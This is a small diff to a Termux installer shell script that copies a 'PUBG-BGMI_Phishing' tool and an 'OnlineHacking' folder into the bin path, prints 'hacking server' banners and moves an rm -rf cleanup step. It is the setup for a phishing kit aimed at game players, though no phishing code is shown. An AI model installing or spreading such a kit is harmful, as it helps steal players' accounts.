@@ -172,7 +172,6 @@ cp -R BGMI /data/data/com.termux/files/usr/bin
 cp -R PUBG-BGMI_Phishing /data/data/com.termux/files/usr/bin
 cp -R OnlineHacking /data/data/com.termux/files/usr/bin
 echo
-rm -rf SUMAN SUMAN1 PUBG-BGMI_Phishing
 echo
 echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server......  \e[m "
 sleep 2
@@ -186,6 +185,7 @@ sleep 4
 echo
 echo -e "\e[1m \e[36m[+] This is Last Step \e[m \e[21"
 echo
+rm -rf SUMAN SUMAN1 PUBG-BGMI_Phishing
 echo
 echo -e "\e[92m[+] Open New type this command:\e[93m PUBG-BGMI_Phishing \e[m "
 echo
